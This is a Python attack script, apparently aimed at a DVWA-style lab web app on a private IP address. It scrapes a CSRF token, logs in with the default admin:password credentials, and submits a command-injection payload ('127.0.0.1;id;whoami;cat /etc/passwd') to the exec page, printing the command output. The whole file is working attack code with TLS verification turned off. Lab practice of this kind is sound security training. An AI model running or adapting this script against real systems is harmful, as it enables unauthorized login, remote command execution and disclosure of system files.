
import urllib.request
import urllib.parse
import http.cookiejar
import re
import ssl

# Create cookie jar and opener
cj = http.cookiejar.CookieJar()
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPRedirectHandler()
)
opener.addheaders = [('User-Agent', 'Mozilla/5.0')]

base = "http://172.29.0.10:80"

# Step 1: GET login page to extract CSRF token
print("[*] Fetching login page...")
try:
    resp = opener.open(f"{base}/login.php", timeout=15)
    body = resp.read().decode('utf-8', errors='replace')
    print(f"[+] Status: {resp.status}, Length: {len(body)}")
    
    # Extract user_token (CSRF)
    token_match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", body)
    if token_match:
        csrf_token = token_match.group(1)
        print(f"[+] CSRF token: {csrf_token}")
    else:
        csrf_token = ""
        print("[!] No CSRF token found, trying without")
    
    # Step 2: POST login with default creds admin/password
    login_data = urllib.parse.urlencode({
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': csrf_token
    }).encode()
    
    print("[*] Attempting login with admin:password...")
    resp2 = opener.open(f"{base}/login.php", data=login_data, timeout=15)
    body2 = resp2.read().decode('utf-8', errors='replace')
    print(f"[+] Status: {resp2.status}, Length: {len(body2)}, URL: {resp2.url}")
    
    if 'Welcome' in body2 or 'index.php' in resp2.url:
        print("[+] LOGIN SUCCESSFUL!")
        
        # Step 3: Try command injection via exec page
        print("[*] Attempting command injection...")
        resp3 = opener.open(f"{base}/vulnerabilities/exec/", timeout=15)
        exec_body = resp3.read().decode('utf-8', errors='replace')
        
        # Extract token from exec page
        exec_token = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", exec_body)
        exec_csrf = exec_token.group(1) if exec_token else ""
        
        inject_data = urllib.parse.urlencode({
            'ip': '127.0.0.1;id;whoami;cat /etc/passwd',
            'Submit': 'Submit',
            'user_token': exec_csrf
        }).encode()
        
        resp4 = opener.open(f"{base}/vulnerabilities/exec/", data=inject_data, timeout=15)
        exec_result = resp4.read().decode('utf-8', errors='replace')
        print(f"[+] Exec response length: {len(exec_result)}")
        # Extract pre tag content
        pre_match = re.search(r'<pre>(.*?)</pre>', exec_result, re.DOTALL)
        if pre_match:
            print(f"[+] Command output:\n{pre_match.group(1)}")
        else:
            print("[*] Raw output snippet:", exec_result[:500])
    else:
        print("[-] Login may have failed")
        print("[*] Response snippet:", body2[:300])
        
except Exception as e:
    print(f"[!] Error: {e}")

